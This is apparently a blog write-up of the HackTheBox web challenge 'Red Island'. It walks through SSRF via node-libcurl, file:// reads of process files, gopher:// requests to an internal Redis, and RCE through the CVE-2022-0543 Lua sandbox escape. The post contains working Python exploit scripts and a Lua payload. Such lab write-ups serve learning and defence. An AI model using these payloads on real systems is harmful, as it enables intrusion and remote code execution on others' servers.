---
title: Red Island
slug: red_island
date: 2024-06-05 00:00:00+0000
image: cover.png 
categories:
    - Write-ups
tags:
    - HackTheBox
    - Challenge
    - Web
---

# TL;DR

The `/generate` endpoint is vulnerable to **SSRF** attack, where the request is processed by *node-libcurl*. This library can be utilize multiple protocols, which come in handy to investigate the current running process.
- `file:///proc/self/cmdline`
- `file:///proc/self/pwd/index.js`

The implementation of the *Redis* service allows for the use of the `gopher://` protocol, revealing the version to be *5.0.7*, which is vulnerable to the **[CVE-2022-0543](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)**.

## Introduction

### What I learned

- Basic **SSRF** with cross-protocol scripting (`gopher://` scheme).
- *Redis* interaction with *Lua* sandbox escape.
- First use of *Caido* tool.

## Application Overview

No source code is provided with this challenge, so I went straight to testing the web application after logging in. I submitted a valid image *URL*, which resulted in my sheep looking even more satanic than it already did.

![valid image url](/red_island/screenshots/valid_image_url.png)

There wasn't much more to interact with on application.

## Enumeration

For the first time I used the [Caido](https://caido.io/) tool, which is a promising alternative to [Burp Suite](https://portswigger.net/burp). I sent the request to my *Replay* tab and started playing with it.

### **SSRF** with node-libcurl

To test if the site was vulnerable to **[Server-Side Request Forgery](https://portswigger.net/web-security/ssrf)**, I first sent a *URL* that was not an image. If the application had processed my request correctly, it should have returned an error message. However, that wasn't quite the case...

![valid_url_ssrf](/red_island/screenshots/valid_url_ssrf.png)

I received an error, but it included the response body of the requested link.

![SSRF Diagram](/red_island/screenshots/SSRF_Diagram.png)

This diagram summarizes what happens behind the scenes during a basic **SSRF** attack. The input is always trusted and returned. If such user input is enabled, the error handling and input validation should be strengthened to allow only certain domains and return appropriate error messages.

To learn more about how the request was processed on the server side, I used [interactsh](https://app.interactsh.com/#/) to identify the library in use.

```HTTP
GET / HTTP/1.1
Host: nblwybgjkdkdtwjedhnb54rribbndgeea.oast.fun
Accept: */*
User-Agent: node-libcurl/2.3.4
```

The library used is [node-libcurl](https://www.npmjs.com/package/node-libcurl), which supports a wide range of protocols.

> libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), file transfer resume, http proxy tunneling and more!
> - <cite> Official description of the *node-libcurl* library</cite>

With this knowledge, I attempted to read a local file using the `file://` scheme.

![reading /etc/passwd](/red_island/screenshots/poc_reading_file_with_ssrf.png)

### *Redis* and the goofy gophers

To learn more about the web application currently running, I read the `/proc/self/cmdline` file, which contains the command used to start the app.

![current process running](/red_island/screenshots/reading_current_process.png)

Next, I viewed the content of the `index.js` file located in `/proc/self/cwd/index.js`.

![current process running](/red_island/screenshots/reading_content_current_process.png)

```js
const express= require('express');
const app= express();
const session= require('express-session');
const RedisStore = require("connect-redis")(session)
const path = require('path');
const cookieParser = require('cookie-parser');
const nunjucks = require('nunjucks');
const routes = require('./routes');
const Database = require('./database');
const { createClient } = require("redis")
const redisClient= createClient({ legacyMode: true })

const db = new Database('/tmp/redisland.db');

app.use(express.json());
app.use(cookieParser());

redisClient.connect().catch(console.error)
<SNIP>
```

[Redis](https://redis.io/) or **RE**mote **DI**ctionary **S**erver is a popular service for caching data in memory.

In this application, *Redis* is used for *session storage* with `redisClient.connect()`. With no options provided, I assumed it was connected to the local address `localhost:6379`.

I am aware that *Redis* implements [gopher](https://en.wikipedia.org/wiki/Gopher_(protocol)), which was an alternative to the [World Wide Web](https://en.wikipedia.org/wiki/World_Wide_Web) in the late 90's.

Given that *node-libcurl* supports multiple protocols for **SSRF**, and gopher can be used to communicate with the *Redis* client, I performed a **Cross-Protocol Scripting** attack using the `gopher://` scheme.

![URI](/red_island/screenshots/uri_gopher.png)

To automate this, I wrote a python script:

```python
from urllib.parse import quote
import requests

URL = "http://<TARGET:HOST>/api/red/generate"
payload = quote("""
INFO

quit
""")
input = {"url":f"gopher://localhost:6379/_{payload}"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
           "Content-Type": "application/json",
           "Cookie": "connect.sid=<SESSION_COOKIE>"}

request = requests.post(url=URL, json=input, headers=headers)
print(str(request.json()).replace("\\n", "\n").replace("\\r", ""))
```

I submitted this payload to gather more information on the current *Redis* instance.

```prolog
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 6.1.0-10-amd64 x86_64
arch_bits:64
<SNIP>
```

A search for vulnerabilities in this specific version of *Redis* (5.0.7) led me to [CVE-2022-0543](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md), discovered by [Reginaldo Silva](https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce).

## Exploitation

### Why?

This vulnerability does not originate directly from *Redis*. On specific distributions, *Lua* is loaded dynamically, which allowed me to perform a **Remote Code Execution** (RCE) on the host by escaping the *Lua* sandbox.

> This vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.
> - <cite>Vulhub GitHub: *Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)*</cite>

### PoC

```lua
-- loading "luaopen_io" module from the library to execute a command
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
-- executing the command 'id'
local f = io.popen("id", "r");
-- reading and returning the output of the command
local res = f:read("*a");
f:close();
return res
```

I passed this *payload* to the [eval](https://redis.io/docs/latest/commands/eval/) command of the *Redis* client.

```python
from urllib.parse import quote
import requests

URL = "http://<TARGET:HOST>/api/red/generate"
payload = quote("""
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
quit
""")
input = {"url":f"gopher://<TARGET:HOST>:6379/_{payload}"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
           "Content-Type": "application/json",
           "Cookie": "<SESSION_COOKIE>"}

request = requests.post(url=URL, json=input, headers=headers)
print(str(request.json()).replace("\\n", "\n").replace("\\r", ""))
```

I was able to successfully achieve **RCE** on the host.

```zsh
$ python script.py
{'message': 'Unknown error occured while fetching the image file: $48
uid=101(redis) gid=101(redis) groups=101(redis)

+OK
'}
```

The flag was located at the system *root* as an executable.

```zsh
$ python script.py
{'message': 'Unknown error occured while fetching the image file: $32
HTB{<REDACTED>}
+OK
'}
```

## References

- https://portswigger.net/web-security/ssrf
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- https://www.npmjs.com/package/node-libcurl
- https://docs.kernel.org/filesystems/proc.html
- https://redis.io
- https://en.wikipedia.org/wiki/Gopher_(protocol)
- https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md
- https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
